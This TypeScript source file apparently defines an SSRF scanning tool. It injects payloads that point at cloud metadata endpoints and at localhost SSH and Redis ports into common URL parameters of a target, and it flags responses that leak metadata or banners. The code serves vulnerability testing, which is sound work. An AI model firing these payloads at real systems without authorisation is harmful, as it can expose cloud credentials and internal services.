import { Tool, ToolInput, ToolOutput } from '@shared/types/tool';

export const SSRFProbeTool: Tool = {
    name: 'ssrf_probe',
    description: 'Tests for Server-Side Request Forgery (SSRF) vulnerabilities.',

    async run(input: ToolInput, signal?: AbortSignal): Promise<ToolOutput> {
        const { target, contextParams } = input;
        const base = contextParams?.baseUrl || target;
        const payloads = [
            'http://169.254.169.254/latest/meta-data/', // AWS/OpenStack
            'http://169.254.169.254/computeMetadata/v1/', // GCP
            'http://127.0.0.1:22', // SSH port
            'http://127.0.0.1:6379', // Redis
            'http://localhost:80',
            'http://[::1]:80',
            'http://metadata.google.internal/computeMetadata/v1/'
        ];

        let requestsMade = 0;
        const findings: string[] = [];
        let vulnerabilityData: any = null;

        for (const payload of payloads) {
            try {
                requestsMade++;
                const baseUrlObj = new URL(target, base);
                const params = ['url', 'src', 'feed', 'target', 'link'];

                for (const param of params) {
                    const testUrl = new URL(baseUrlObj.toString());
                    testUrl.searchParams.set(param, payload);

                    const response = await fetch(testUrl.toString(), { signal });
                    const text = await response.text();

                    // Logic: Look for metadata-specific strings or SSH banners
                    if (text.includes('ami-id') || text.includes('instance-id') || text.includes('SSH-2.0-')) {
                        findings.push(`Verified SSRF at ${target} via parameter '${param}'`);
                        vulnerabilityData = {
                            vulnerability: 'Server-Side Request Forgery (SSRF)',
                            payload,
                            parameter: param,
                            evidence: "Internal metadata or service banner leaked in response.",
                            remediation: "Implement a strict allowlist for outgoing requests and use a network proxy."
                        };
                        break;
                    }
                }
                if (findings.length > 0) break;
            } catch (e: any) {
                // Ignore failures
            }
        }

        return { findings, requestsMade, data: vulnerabilityData || { status: 'clean' } };
    }
};
